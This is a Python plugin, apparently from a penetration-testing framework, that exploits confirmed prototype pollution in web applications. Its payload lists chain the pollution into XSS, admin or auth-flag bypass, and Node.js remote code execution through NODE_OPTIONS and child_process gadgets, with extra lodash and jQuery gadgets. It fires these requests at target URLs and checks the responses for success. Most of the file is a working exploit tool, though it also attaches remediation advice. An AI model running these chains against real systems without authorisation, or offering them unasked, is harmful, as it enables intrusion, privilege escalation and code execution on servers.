"""Prototype pollution exploitation — chains PP to XSS/auth bypass."""

from __future__ import annotations

from typing import ClassVar
from urllib.parse import quote

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# PP → XSS gadget chains
PP_XSS_PAYLOADS = [
    ("__proto__[innerHTML]", "<img src=x onerror=alert(1)>"),
    ("__proto__[srcdoc]", "<script>alert(1)</script>"),
    ("__proto__[onload]", "alert(1)"),
    ("__proto__[onfocus]", "alert(1)"),
    ("__proto__[src]", "javascript:alert(1)"),
    ("__proto__[href]", "javascript:alert(1)"),
    ("__proto__[data]", "javascript:alert(1)"),
    ("constructor[prototype][innerHTML]", "<img src=x onerror=alert(1)>"),
]

# PP → Auth bypass gadgets
PP_AUTH_PAYLOADS = [
    ("__proto__[isAdmin]", "true"),
    ("__proto__[admin]", "1"),
    ("__proto__[role]", "admin"),
    ("__proto__[auth]", "true"),
    ("__proto__[authorized]", "true"),
    ("__proto__[verified]", "true"),
]

# PP → Server-side RCE gadgets (Node.js)
PP_RCE_PAYLOADS = [
    ("__proto__[shell]", "/proc/self/exe"),
    ("__proto__[argv0]", "/bin/id"),
    ("__proto__[env][NODE_OPTIONS]", "--require /proc/self/environ"),
    ("__proto__[env][EVIL]", "require('child_process').execSync('id')"),
]

# Known library-specific gadgets
LODASH_GADGETS = [
    ("__proto__[template][evaluate]", "{{constructor.constructor('return this')().process}}"),
]

JQUERY_GADGETS = [
    ("__proto__[context]", "<img src=x onerror=alert(1)>"),
    ("__proto__[jquery]", "x]<img src=x onerror=alert(1)>"),
]


class PpExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="pp_exploit",
        display_name="Prototype Pollution Exploitation",
        category=PluginCategory.PENTESTING,
        description="Chains confirmed prototype pollution to XSS, auth bypass, or RCE",
        depends_on=["prototype_pollution"],
        produces=["pp_exploit_results"],
        timeout=45.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        # Get confirmed PP endpoints from upstream
        pp_key = f"prototype_pollution:{target.host}"
        pp_result = ctx.pipeline.get(pp_key)

        if not pp_result or not pp_result.ok:
            return PluginResult.skipped(
                self.meta.name, target.host,
                reason="prototype_pollution results not available",
            )

        pp_endpoints = pp_result.data.get("vulnerable_endpoints", [])
        if not pp_endpoints:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("No confirmed PP endpoints to exploit")],
                data={"chains": []},
            )

        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        findings: list[Finding] = []
        chains: list[dict] = []

        # Check tech_detect for known vulnerable libraries
        tech_key = f"tech_detect:{target.host}"
        tech_result = ctx.pipeline.get(tech_key)
        detected_techs = set()
        if tech_result and tech_result.ok:
            for t in tech_result.data.get("technologies", []):
                name = t.get("name", "") if isinstance(t, dict) else str(t)
                detected_techs.add(name.lower())

        extra_gadgets = []
        if any("lodash" in t for t in detected_techs):
            extra_gadgets.extend(LODASH_GADGETS)
        if any("jquery" in t for t in detected_techs):
            extra_gadgets.extend(JQUERY_GADGETS)

        for ep in pp_endpoints:
            if ctx.should_stop:
                break

            url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
            if not url:
                continue

            # Test XSS chains
            for prop, value in PP_XSS_PAYLOADS + extra_gadgets:
                if ctx.should_stop:
                    break
                result = await self._test_pp_chain(
                    ctx, url, prop, value, "xss",
                )
                if result:
                    chains.append(result)
                    findings.append(Finding.critical(
                        f"PP→XSS chain confirmed: {prop}",
                        description=(
                            f"Prototype pollution on {url} can be chained "
                            f"to XSS via {prop}={value}"
                        ),
                        evidence=f"URL: {url}, Property: {prop}",
                        remediation=(
                            "Fix prototype pollution vulnerability. "
                            "Freeze Object.prototype. Use Map instead of {}."
                        ),
                        tags=["pentesting", "prototype-pollution", "xss"],
                    ))
                    break  # One XSS chain is enough

            # Test auth bypass chains
            for prop, value in PP_AUTH_PAYLOADS:
                if ctx.should_stop:
                    break
                result = await self._test_pp_chain(
                    ctx, url, prop, value, "auth_bypass",
                )
                if result:
                    chains.append(result)
                    findings.append(Finding.high(
                        f"PP→Auth bypass: {prop}={value}",
                        description=(
                            f"Prototype pollution may enable auth bypass "
                            f"via {prop}"
                        ),
                        evidence=f"URL: {url}",
                        remediation="Fix prototype pollution vulnerability",
                        tags=["pentesting", "prototype-pollution", "auth-bypass"],
                    ))
                    break

            # Test RCE chains (server-side)
            for prop, value in PP_RCE_PAYLOADS:
                if ctx.should_stop:
                    break
                result = await self._test_pp_chain(
                    ctx, url, prop, value, "rce",
                )
                if result:
                    chains.append(result)
                    findings.append(Finding.critical(
                        f"PP→RCE potential: {prop}",
                        description=(
                            f"Server-side prototype pollution may enable RCE "
                            f"via {prop}"
                        ),
                        evidence=f"URL: {url}, Response: {result.get('evidence', '')}",
                        remediation=(
                            "Fix prototype pollution. "
                            "Use --frozen-intrinsics in Node.js."
                        ),
                        tags=["pentesting", "prototype-pollution", "rce"],
                    ))
                    break

        if not findings:
            findings.append(Finding.info(
                "No exploitable PP chains found",
                tags=["pentesting", "prototype-pollution"],
            ))

        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={"chains": chains, "endpoints_tested": len(pp_endpoints)},
        )

    async def _test_pp_chain(
        self, ctx, base_url: str, prop: str, value: str, chain_type: str,
    ) -> dict | None:
        """Test a single PP chain. Returns result dict if the chain has effect."""
        # Build polluted URL
        sep = "&" if "?" in base_url else "?"
        payload_url = f"{base_url}{sep}{quote(prop)}={quote(value)}"

        try:
            # Get baseline response
            async with ctx.rate:
                baseline = await ctx.http.get(base_url, timeout=8.0)
                baseline_status = baseline.status
                baseline_body = await baseline.text(encoding="utf-8", errors="replace")
                baseline_len = len(baseline_body)

            # Send polluted request
            async with ctx.rate:
                resp = await ctx.http.get(payload_url, timeout=8.0)
                status = resp.status
                body = await resp.text(encoding="utf-8", errors="replace")

            # Detect effect
            evidence = ""

            if chain_type == "xss":
                # Check if XSS payload appears in DOM
                xss_indicators = ["onerror=", "javascript:", "<script>", "<img src=x"]
                for indicator in xss_indicators:
                    if indicator in body and indicator not in baseline_body:
                        evidence = f"XSS payload reflected: {indicator}"
                        break

            elif chain_type == "auth_bypass":
                # Check for status change or new content
                if status != baseline_status:
                    evidence = f"Status changed: {baseline_status} → {status}"
                elif abs(len(body) - baseline_len) > 200:
                    evidence = f"Response size changed: {baseline_len} → {len(body)}"

            elif chain_type == "rce":
                # Check for server error (crash = DoS) or command output
                if status == 500 and baseline_status != 500:
                    evidence = "Server error triggered (potential DoS via PP)"
                if "uid=" in body and "uid=" not in baseline_body:
                    evidence = "Command output detected in response"

            if evidence:
                return {
                    "url": base_url,
                    "property": prop,
                    "value": value,
                    "chain_type": chain_type,
                    "evidence": evidence,
                }
        except Exception:
            pass

        return None
